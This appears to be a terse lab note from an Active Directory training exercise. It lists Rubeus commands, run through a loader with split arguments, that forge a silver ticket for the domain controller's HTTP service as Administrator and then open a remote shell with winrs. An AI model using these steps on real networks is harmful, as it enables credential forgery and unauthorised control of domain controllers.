[[Lateral Movement]]
this is only to abuse users. 
```
C:\AD\Tools\ArgSplit.bat
```
```
echo %Pwn% -> silver
```
```
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:<machine-hosting-this-user> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
check if we got the correct service ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn%
```
now we have the proper ticket.
```
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
```
```
set username
```
```
set computername
```
